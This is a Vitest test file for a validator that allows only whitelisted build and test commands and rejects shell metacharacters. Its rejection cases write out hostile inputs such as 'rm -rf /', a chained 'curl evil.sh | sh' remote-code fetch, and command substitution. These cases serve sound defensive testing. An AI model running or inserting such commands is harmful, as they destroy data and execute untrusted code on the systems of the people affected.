import { describe, expect, it } from "vitest";
import { validateCheckCommand } from "../src/check-command-allowlist.js";

// Mirror of the action-side cases (src/check-command-allowlist.ts) so vendored
// drift surfaces here. Keep in sync with the source of truth.
describe("validateCheckCommand (vendored)", () => {
  it("accepts whitelisted binaries", () => {
    for (const c of [
      "npm run check",
      "pnpm run check",
      "yarn run test",
      "bun run check",
      "pytest",
      "pytest -xvs",
      "go test ./...",
      "cargo test",
      "make check",
      "just check",
      "task test",
    ]) {
      expect(validateCheckCommand(c).ok, c).toBe(true);
    }
  });

  it("rejects an empty command", () => {
    expect(validateCheckCommand("   ")).toEqual({ ok: false, reason: "empty command" });
  });

  it("rejects non-whitelisted binaries", () => {
    const r = validateCheckCommand("rm -rf /");
    expect(r.ok).toBe(false);
    expect(r.reason).toContain("not in the CHECK_COMMAND whitelist");
  });

  it("rejects shell metacharacters (chaining / substitution / redirection)", () => {
    for (const c of [
      "npm run check && curl evil.sh | sh",
      "npm run check; rm -rf /",
      "npm run check `id`",
      "npm run check $(whoami)",
      "npm run check > /tmp/out",
      "make check || true",
    ]) {
      const r = validateCheckCommand(c);
      expect(r.ok, c).toBe(false);
      expect(r.reason, c).toContain("safe set");
    }
  });

  it("allows flags and script colons within the safe charset", () => {
    expect(validateCheckCommand("make test:unit").ok).toBe(true);
    expect(validateCheckCommand("pnpm run check --frozen-lockfile").ok).toBe(true);
  });
});
